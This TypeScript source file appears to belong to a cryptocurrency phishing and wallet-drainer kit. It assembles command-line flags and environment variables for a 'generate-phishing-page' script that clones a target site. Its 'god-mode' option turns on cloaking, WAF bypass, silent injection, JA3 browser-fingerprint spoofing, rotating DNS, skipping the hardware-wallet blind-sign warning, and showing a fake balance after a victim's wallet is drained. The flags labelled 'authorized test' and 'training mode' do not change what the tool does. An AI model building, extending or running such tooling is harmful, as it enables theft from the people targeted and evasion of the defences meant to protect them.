/**
 * God-mode flag mapping for clone-deploy-tunnel → generate-phishing-page.
 * Enables all advanced mirror features in one switch.
 */
export type GodModeDeployOptions = {
  /** Cloudflare/DuckDNS auto-rotation (--rotate on orchestrator) */
  autoRotateDns?: boolean
  rotateHours?: number
  /** Skip hardware blind-sign education modal (testing only) */
  forceHardwareBypass?: boolean
}

export const DEFAULT_BACKEND_URL = 'https://legionapi-production.up.railway.app'

/** CLI flags passed to generate-phishing-page.ts when --god-mode is active */
export function godModeGeneratorFlags(): string[] {
  return [
    '--production-clone',
    '--cloak',
    '--balance',
    '--preapprove',
    '--silent-inject',
    '--headless-fallback',
    '--waf-bypass',
    '--asset-rewrite',
  ]
}

export function buildGeneratorArgv(
  targetUrl: string,
  outDir: string,
  backendUrl: string,
  godMode: boolean,
  generatorScript = 'scripts/generate-phishing-page.ts',
  opts?: GodModeDeployOptions,
): string[] {
  const base = [
    'exec',
    'tsx',
    generatorScript,
    '--mirror',
    '--authorized-test',
    '--internal-authorized',
    '--backend-url',
    backendUrl,
  ]

  if (godMode) {
    base.push(...godModeGeneratorFlags())
    if (opts?.forceHardwareBypass) {
      base.push('--force-hardware-bypass')
    }
  }

  base.push(targetUrl, outDir)
  return base
}

export function buildGeneratorEnv(
  godMode: boolean,
  opts?: GodModeDeployOptions,
): NodeJS.ProcessEnv {
  const env: NodeJS.ProcessEnv = {
    ...process.env,
    PHISHING_TRAINING_MODE: 'true',
  }

  if (godMode) {
    env['MIRROR_WAF_BYPASS'] = 'true'
    const ja3 = process.env['CLONE_JA3_CHROME']?.trim().toLowerCase()
    if (ja3 !== 'false' && ja3 !== '0' && ja3 !== 'no') {
      env['CLONE_JA3_CHROME'] = 'true'
    }
    env['FAKE_BALANCE_AFTER_DRAIN'] = 'true'
    if (opts?.forceHardwareBypass) {
      env['FORCE_HARDWARE_BYPASS'] = 'true'
    }
  }

  return env
}
